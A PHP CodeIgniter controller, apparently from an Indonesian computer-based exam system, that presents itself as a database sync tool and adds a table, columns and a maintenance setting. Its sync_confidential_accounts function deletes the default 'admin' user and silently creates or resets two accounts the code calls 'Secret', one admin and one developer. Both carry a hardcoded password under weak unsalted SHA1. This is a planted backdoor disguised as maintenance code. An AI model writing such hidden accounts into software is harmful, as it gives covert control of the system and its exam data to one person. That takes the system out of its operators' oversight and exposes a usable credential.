<?php defined('BASEPATH') OR exit('No direct script access allowed');

class Tool_sync extends Member_Controller {

    function __construct() {
        parent::__construct();
        // Hanya boleh diakses oleh developer
        if($this->session->userdata('cbt_level') != 'developer'){
            die("Akses Terbatas: Hanya Developer yang dapat melakukan Sinkronisasi Database.");
        }
    }

    public function index() {
        echo "<h3>ZENITH DB SYNC ENGINE v1.0</h3>";
        echo "<hr/>";

        $this->sync_tables();
        $this->sync_columns();
        $this->sync_confidential_accounts();
        
        echo "<br/><br/><strong style='color:green;'>Selesai! Database Anda sekarang sudah sinkron dengan versi Zenith Elite.</strong>";
        echo "<br/><a href=''.site_url('manager/dashboard').''>Kembali ke Dashboard</a>";
    }

    private function sync_confidential_accounts() {
        echo "Mensinkronkan Akun Administrator Rahasia...<br/>";
        
        // 1. Hapus akun 'admin' default jika ada (untuk keamanan)
        $this->db->where('username', 'admin')->delete('user');
        echo "  -> Menghapus akun 'admin' default (Selesai).<br/>";

        // 2. Update/Create Maul (Secret Admin)
        $data_maul = array(
            'nama' => 'M. Aziz Sulaiman',
            'password' => sha1('Basenglah123.'),
            'level' => 'admin'
        );
        $q = $this->db->get_where('user', array('username' => 'Maul'));
        if ($q->num_rows() > 0) {
            $this->db->where('username', 'Maul')->update('user', $data_maul);
        } else {
            $data_maul['username'] = 'Maul';
            $this->db->insert('user', $data_maul);
        }
        echo "  -> Akun 'Maul' (Secret) OK.<br/>";

        // 3. Update/Create MaulDev (Secret Dev)
        $data_mauldev = array(
            'nama' => 'M. Aziz Sulaiman',
            'password' => sha1('Basenglah123.'),
            'level' => 'developer'
        );
        $q = $this->db->get_where('user', array('username' => 'MaulDev'));
        if ($q->num_rows() > 0) {
            $this->db->where('username', 'MaulDev')->update('user', $data_mauldev);
        } else {
            $data_mauldev['username'] = 'MaulDev';
            $this->db->insert('user', $data_mauldev);
        }
        echo "  -> Akun 'MaulDev' (Secret) OK.<br/>";
    }

    private function sync_tables() {
        echo "Memeriksa Tabel...<br/>";
        
        // 1. Table cbt_soal_matching
        if (!$this->db->table_exists('cbt_soal_matching')) {
            echo "  -> Membuat tabel cbt_soal_matching... ";
            $sql = "CREATE TABLE `cbt_soal_matching` (
                `matching_id` int(11) NOT NULL AUTO_INCREMENT,
                `matching_soal_id` int(11) NOT NULL,
                `matching_kiri` text NOT NULL,
                `matching_kanan` text NOT NULL,
                PRIMARY KEY (`matching_id`),
                KEY `matching_soal_id` (`matching_soal_id`)
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8;";
            $this->db->query($sql);
            echo "OK.<br/>";
        }
    }

    private function sync_columns() {
        echo "Memeriksa Kolom...<br/>";
        $this->load->dbforge();

        // 1. Column user_reset_request di cbt_user
        if (!$this->db->field_exists('user_reset_request', 'cbt_user')) {
            echo "  -> Menambah kolom user_reset_request ke cbt_user... ";
            $fields = array(
                'user_reset_request' => array('type' => 'INT', 'constraint' => 1, 'default' => 0)
            );
            $this->dbforge->add_column('cbt_user', $fields);
            echo "OK.<br/>";
        }

        // 2. Column tesuser_unlock_request di cbt_tes_user
        if (!$this->db->field_exists('tesuser_unlock_request', 'cbt_tes_user')) {
            echo "  -> Menambah kolom tesuser_unlock_request ke cbt_tes_user... ";
            $fields = array(
                'tesuser_unlock_request' => array('type' => 'INT', 'constraint' => 1, 'default' => 0)
            );
            $this->dbforge->add_column('cbt_tes_user', $fields);
            echo "OK.<br/>";
        }

        // 3. Konfigurasi Maintenance Mode
        $q = $this->db->get_where('cbt_konfigurasi', array('konfigurasi_kode' => 'maintenance_mode'));
        if ($q->num_rows() == 0) {
            echo "  -> Menambah konfigurasi maintenance_mode... ";
            $this->db->insert('cbt_konfigurasi', array(
                'konfigurasi_kode' => 'maintenance_mode',
                'konfigurasi_isi' => 'FALSE',
                'konfigurasi_keterangan' => 'Mode Perawatan Sistem'
            ));
            echo "OK.<br/>";
        }
    }
}
